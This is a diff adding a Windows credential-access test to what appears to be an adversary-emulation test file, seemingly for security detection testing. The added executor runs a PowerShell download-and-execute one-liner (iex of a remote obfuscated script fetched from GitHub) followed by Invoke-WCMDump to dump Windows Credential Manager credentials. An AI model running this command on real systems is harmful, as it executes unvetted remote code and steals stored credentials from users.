@@ -349,3 +349,13 @@ atomic_tests:
     cleanup_command: |-
       rm .\System.Data.SQLite.dll -ErrorAction Ignore
     name: powershell
+- name: WinPwn - Loot local Credentials - Invoke-WCMDump 
+  description: Loot local Credentials - Invoke-WCMDump technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
+      Invoke-WCMDump
+    name: powershell
+  
